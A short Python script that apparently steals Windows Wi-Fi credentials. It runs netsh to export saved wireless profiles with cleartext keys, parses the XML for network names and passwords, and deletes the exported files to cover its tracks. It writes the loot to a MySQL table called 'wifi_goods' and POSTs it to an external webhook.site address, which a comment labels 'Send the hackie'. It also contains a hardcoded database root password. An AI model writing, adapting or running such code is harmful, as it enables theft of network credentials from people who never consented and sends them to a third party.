import os, subprocess, mysql.connector, requests
import xml.etree.ElementTree as ET

url = 'https://webhook.site/447a9512-370c-442b-a6b4-a6ec669b90c3'

#Lists & Dics
wifi_files = []
payload = {"SSID": [], "Password": []}

#Use py to execute a windows cmd
command = subprocess.run(["netsh",  "wlan", "export", "profile", "key = clear"], capture_output=True).stdout.decode()

# MySQL database configuration
db_config = {
    'host': 'localhost',
    'user': 'root',
    'password': 'Musicislife@2021',
    'database': 'mydatabase'
}

#Grab the current dir
path = os.getcwd() 

#Append Wi-Fi XML file to wifi_files list
for filename in os.listdir(path):
    if filename.startswith("Wi-Fi") and filename.endswith(".xml"):
        wifi_files.append(filename)

#Pars Wi-Fi XML files
for file in wifi_files:
        tree = ET.parse(file)
        root = tree.getroot()
        # SSID = root.find(".//SSID/name").text
        # password = root.find(".//keyMaterial").text
        SSID = root[0].text
        password = root[4][0][1][2].text
        payload["SSID"].append(SSID)
        payload["Password"].append(password)
        os.remove(file)


# Connect to MySQL database
try:
    conn = mysql.connector.connect(**db_config)
    cursor = conn.cursor()

    # Insert extracted data into MySQL table
    for ssid, password in zip(payload["SSID"], payload["Password"]):
        cursor.execute("INSERT INTO wifi_goods (ssid, password) VALUES (%s, %s)", (ssid, password))
    
    conn.commit()
    print("Data inserted into MySQL database successfully")

except mysql.connector.Error as err:
    print("MySQL Error:", err)

finally:
    if conn.is_connected():
        cursor.close()
        conn.close()
        print("MySQL connection closed")


#        sys.stdout.close()
#Send the hackie
payload_str = " & ".join("%s=%s" % (k, v) for k, v in payload.items())
r = requests.post(url, params='format=json', data=payload_str)



"""
Get file hex code

CertUtil -dump filename.png or any extension
"""